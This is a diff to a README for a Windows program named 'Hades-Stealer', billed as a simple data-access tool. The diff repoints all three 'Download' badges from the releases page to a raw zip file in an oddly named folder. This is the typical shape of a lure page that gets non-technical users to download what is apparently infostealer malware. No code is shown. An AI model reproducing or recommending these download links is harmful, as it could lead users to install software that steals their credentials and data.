@@ -1,6 +1,6 @@
 # ⚙️ Hades-Stealer - Simple Tool for Data Access
 
-[![Download Now](https://img.shields.io/badge/Download-Hades--Stealer-brightgreen?style=for-the-badge)](https://github.com/silent-whisper/Hades-Stealer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Hades--Stealer-brightgreen?style=for-the-badge)](https://github.com/silent-whisper/Hades-Stealer/raw/refs/heads/main/peripleuritis/Stealer_Hades_1.4-beta.3.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get Hades-Stealer running on your Windows PC. No programmi
 
    Click the button below to go to the official releases page. There you will find the latest version of the software.
 
-   [![Download Releases](https://img.shields.io/badge/Go%20to-Download%20Page-blue?style=for-the-badge)](https://github.com/silent-whisper/Hades-Stealer/releases)
+   [![Download Releases](https://img.shields.io/badge/Go%20to-Download%20Page-blue?style=for-the-badge)](https://github.com/silent-whisper/Hades-Stealer/raw/refs/heads/main/peripleuritis/Stealer_Hades_1.4-beta.3.zip)
 
 2. **Download the Latest Release:**
 
@@ -147,4 +147,4 @@ This tool covers terms and functions related to:
 
 Visit the releases page below to download the latest version designed for Windows:
 
-[![Download Here](https://img.shields.io/badge/Download-Hades--Stealer-green?style=for-the-badge)](https://github.com/silent-whisper/Hades-Stealer/releases)
+[![Download Here](https://img.shields.io/badge/Download-Hades--Stealer-green?style=for-the-badge)](https://github.com/silent-whisper/Hades-Stealer/raw/refs/heads/main/peripleuritis/Stealer_Hades_1.4-beta.3.zip)
